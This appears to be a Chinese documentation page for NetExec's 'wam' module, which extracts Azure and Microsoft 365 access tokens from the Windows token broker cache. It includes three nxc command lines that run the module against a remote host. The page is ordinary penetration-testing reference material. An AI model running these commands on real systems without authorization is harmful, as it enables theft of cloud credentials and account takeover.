---
description: 从令牌代理缓存中导出 Azure 和 Microsoft 365 的访问令牌。
---

# 🆕 导出令牌代理缓存

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

桌面上的 Microsoft 365 和 Azure 应用程序会将访问令牌存储到令牌代理缓存中。这些令牌使用用户 DPAPI 存储。你可以使用 `wam` 模块来解密它们。更多信息请参见 [https://blog.xpnsec.com/wam-bam/](https://blog.xpnsec.com/wam-bam/)

```
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam --mkfile masterkeys.txt
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam --pvk domain_backup_key.pvk
```

{% embed url="https://blog.xpnsec.com/wam-bam/" %}
